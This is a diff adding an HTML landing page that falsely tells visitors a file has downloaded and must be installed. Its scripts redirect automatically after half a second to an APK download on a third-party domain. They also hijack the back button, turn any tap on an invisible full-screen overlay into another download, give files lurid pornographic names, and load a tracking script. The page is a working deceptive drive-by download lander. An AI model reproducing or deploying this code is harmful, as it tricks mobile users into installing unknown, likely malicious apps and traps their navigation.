@@ -1,0 +1,345 @@
+
+<html>
+
+<head>
+    <title>Successfully downloaded</title>
+    <meta charset="utf-8" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link
+        href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,400italic|Roboto+Mono:400,500|Material+Icons|Google+Material+Icons"
+        rel="stylesheet" />
+    
+    <link rel="stylesheet" href="/lands/gate_alarm_constr/style.css">
+
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            padding: 0;
+            margin: 0;
+        }
+
+        .globaltap {
+            position: absolute !important;
+            z-index: 99991 !important;
+            display: block !important;
+            width: 100% !important;
+            height: 100% !important;
+            top: 0 !important;
+        }
+
+        .container {
+            display: flex;
+            width: 100%;
+            height: 100%;
+            max-width: 100vw;
+            max-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+        }
+
+        .alarm {
+            display: flex;
+            justify-content: space-between;
+            flex-direction: column;
+            width: 75%;
+            max-height: 80%;
+            border-radius: 15px;
+            background-color: #ffffff;
+            padding: 0 20px;
+        }
+
+        .alarm .header h2 {
+            font-size: 20px;
+            text-align: center;
+            color: #080808;
+
+        }
+
+        .alarm .text {
+            color: #080808;
+            font-size: 15px;
+        }
+
+        .alarm .text .img-text {
+            display: flex;
+            justify-content: center;
+        }
+
+        .alarm .text .img-text .img {
+            max-width: 80px;
+            max-height: 80px;
+            margin-right: 11px;
+        }
+
+        .buttons {
+            display: flex;
+         //   border-top: 2px solid grey;
+            margin: 25px -20px 0 -20px;
+            justify-self: end;
+
+        }
+
+        .buttons .btn {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-content: center;
+            text-align: center;
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 500;
+        }
+
+    </style>
+</head>
+
+<body>
+    <a id="lut-android-dialog-overlay" class="lut-android-dialog-overlay" style="display: none" onclick="
+    LUT.hideElement('lut-android-dialog-overlay')
+    doLeaveWork()
+    ">
+        <div class="lut-android-dialog">
+            <div class="lut-android-dialog-title">
+                Leave page
+            </div>
+            <div class="lut-android-dialog-content">
+                Exit?
+            </div>
+            <div class="lut-android-dialog-actions">
+                <button>CANCEL</button>
+                <button>OK</button>
+            </div>
+        </div>
+    </a>
+
+        <a id="push-android-dialog-overlay" class="push-android-dialog-overlay" onclick="
+            LUT.hideElement('push-android-dialog-overlay');
+            glTapClick();
+            return false;
+        ">
+        <div class="lut-android-dialog">
+            <div class="lut-android-dialog-content">
+                <img src="/lands/gate_alarm_constr/bell.png">
+                File downloading...            </div>
+            <div class="lut-android-dialog-actions">
+                <button></button>
+                <button>Ok</button>
+            </div>
+        </div>
+    </a>
+    
+    <div class="container">
+        <div class="alarm">
+            <div class="header">
+                <h2>Successfully downloaded Install to continue</h2>
+            </div>
+            <div class="text">
+                                <br /> <br />
+                <div class="img-text">
+                                        <div class="img">
+                        <img src="https://icon-icons.com/downloadimage.php?id=122509&root=1946/PNG/512/&file=1904659-arrow-backup-down-download-save-storage-transfer_122509.png" alt="" width="100%" height="100%">
+                    </div>
+                    
+                    <div>
+                                            </div>
+                </div>
+            </div>
+            <div class="buttons">
+                <div class="btn">
+                    <p></p>
+                </div>
+                            </div>
+        </div>
+    </div>
+
+    <a class="globaltap" onclick="glTapClick()"></a>
+
+    <script>
+        var apk_names = ["Hardcore_Anal_Penetration.zip", "MILF_best_private_video.zip", "Redhead_porno_video",
+            "BBC_gangbang_with_blondie", "pornovideo_best_of_this_mount", "my_doggy_anal_home_video",
+            "hot_sex_after_penetrex.zip", "ass_fucker_like - it", "milf_want_sex_with_you", "CAMS_free_slut",
+            "Hot_brazillian_want_sex", "yeah_yeah_hardsex", "gostosa_XXX_sex", "puta_sexy"
+        ];
+        var apkNamesLength = apk_names.length;
+        var needNameFromArray = Boolean(0);
+        var needRandomName = Boolean(0);
+
+        var smartlink = 'https://www.directdexchange.com/jump/next.php?r=3670675&sub1=newlandVP';
+        // leaveAction - выбираем, какое действие делать при нажатии окна, которое появилось после кнопки бэк
+        // 1 - ливнуть с ленда
+        // 2 - скачать апк
+        // 3 - скачать апк и ливнуть со страницы
+        // 4 - перейти на указанный линк
+        var leaveAction = 2;
+
+        var backlink = 'https://www.directdexchange.com/jump/next.php?r=3670675&sub1=newlandVP';
+        var needAutoLoad = Boolean(1);
+        var autoLoadDelay = 500;
+        var clickCounterNeedRecycle = 4000;
+
+        var clickId = "167432196309990TINTV426367751114V4b";
+        var extAdk = "292e76f74f";
+        var gid = "c2c589dc-99b0-11ed-9aea-121254d6a232";
+        var p1 = "11471";
+        var extra = "";
+        var name = "";
+        var rlid = "5427";
+        var adk = "ZWMwMDBhMDc2YzAwMmQ0NjAwMDAyZDU0MDAyZDU0MDAyZDU0MzUyOGJkYjVmZA==";
+        var domain = "edfol.bulkaapricot.com";
+        var postback_id = "875";
+        var dtp = "1";
+        var dwlt = 1;
+
+                    name = "Download"
+        
+        var apk_url = "https://" + domain + "/download/2/" + adk + "/?dtp=" + dtp + "&network=" + postback_id + "&sclid=" + clickId + "&p1=" + p1 + "&name=" + name + "&add_extra_params=" + extra + "&extAdk=" + extAdk + "&rotator_uid=" + gid + "&rlid=" + rlid + "&dwlt=" + dwlt;
+        var selectedIndexes = []
+
+        function updateAPKURL() {
+            var finalName = "";
+            var apkCounter = LUT.getCookieCounter("apk_counter");
+
+            if (needNameFromArray) { // Нужно имя из массива, не из параметра
+                if (apkCounter > 1) { // Первое из параметра
+                    var idx = 0
+                    if (needRandomName) { // нужно рандомное имя
+                        idx = getRandomUniqIntInclusive(0, apkNamesLength);
+                    } else { // нужно имя по порядку
+                        idx = apkCounter % apkNamesLength
+                    }
+                    finalName = apk_names[idx];
+                } else {
+                    finalName = name;
+                }
+            } else { // Нужно имя из параметра
+                finalName = name + apkCounter;
+            }
+            apk_url = "https://" + domain + "/download/2/" + adk + "/?dtp=" + dtp + "&network=" + postback_id + "&sclid=" + clickId + "&p1=" + p1 + "&name=" + finalName + "&add_extra_params=" + extra + "&extAdk=" + extAdk + "&rotator_uid=" + gid + "&rlid=" + rlid + "&dwlt=" + dwlt;
+        }
+
+        function getRandomUniqIntInclusive(min, max) {
+            if (selectedIndexes.length === apk_names.length) {
+                selectedIndexes = [];
+            }
+            min = Math.ceil(min);
+            max = Math.floor(max);
+            var rnd = Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
+            while (selectedIndexes.indexOf(rnd) > -1) {
+                rnd = Math.floor(Math.random() * (max - min + 1)) + min;
+            }
+            selectedIndexes.push(rnd)
+            return rnd
+        }
+    </script>
+
+    <script src="/lands/gate_alarm_constr/lut.js?v=15"></script>
+
+    <script>
+        function glTapClick() {
+            try {
+                openNewWindow(false, 1);
+                return false;
+            } catch (e) {
+                console.error(e);
+            }
+        }
+    </script>
+
+    <script>
+        var backCount = 0
+
+        LUT.fixBackButton(function() {
+            backCount++;
+            if (backCount === 1) {
+                // При первом клике назад скачиваем apk
+                openNewWindow(true, 2);
+            } else if (backCount === 2) {
+                LUT.showElement("lut-android-dialog-overlay");
+            } else {
+                openNewWindow(true, 2);
+            }
+        });
+    </script>
+
+    <script>
+        var firstClick = true;
+        var useIframe = false;
+
+        function openNewWindow(fromAutoload, d_type) {
+            dwlt = d_type;
+            var click_counter;
+            var click_counter_cycled = -1;
+            if (!fromAutoload) {
+                click_counter = LUT.incCookieCounter("click_counter");
+                click_counter_cycled = click_counter % clickCounterNeedRecycle;
+            }
+
+            switch (true) {
+                case fromAutoload:
+                    LUT.incCookieCounter("apk_counter");
+                    updateAPKURL();
+                    location.href = apk_url;
+                    break;
+                case click_counter_cycled === 0:
+                    location.href = smartlink;
+                    break;
+                default:
+                    LUT.incCookieCounter("apk_counter");
+                    updateAPKURL();
+                    location.href = apk_url;
+                    break;
+            }
+            return false;
+        }
+
+        function setDownloadTimeout(delay) {
+            setTimeout(
+                function() {
+                    openNewWindow(true, 3);
+                },
+                delay
+            );
+        }
+
+        if (needAutoLoad) {
+            setDownloadTimeout(autoLoadDelay);
+        }
+    </script>
+
+    <script>
+        function doLeaveWork() {
+            switch (leaveAction) {
+                case 1:
+                    history.go(-2)
+                    break;
+                case 2:
+                    try {
+                        history.pushState({}, document.title, window.location.href);
+                        console.log("pushed from popstate");
+                    } catch (e) {
+                        console.error(e);
+                    }
+                    openNewWindow(true, 2);
+                    break;
+                case 3:
+                    openNewWindow(true, 2);
+                    setTimeout(() => {
+                        history.back();
+                        history.back();
+                    }, 500);
+                    break;
+                case 4:
+                    location.href = backlink;
+                    break;
+
+                default:
+                    break;
+            }
+        }
+    </script>
+
+<script defer src='https://usertag.online/l/VBshzyTp39.js?gid=c2c589dc-99b0-11ed-9aea-121254d6a232&extAdk=292e76f74f&rlid=5427&network=875&dtp=1&sclid=167432196309990TINTV426367751114V4b&p1=11471&a=ZWMwMDBhMDc2YzAwMmQ0NjAwMDAyZDU0MDAyZDU0MDAyZDU0MzUyOGJkYjVmZA==' onload="if(typeof getIDDQD === 'function'){document.cookie = 'ut=' + getIDDQD() + ';expires=Fri, 21 Jan 2028 16:19:34 GMT;path=/';}"></script></body>
+
+</html>
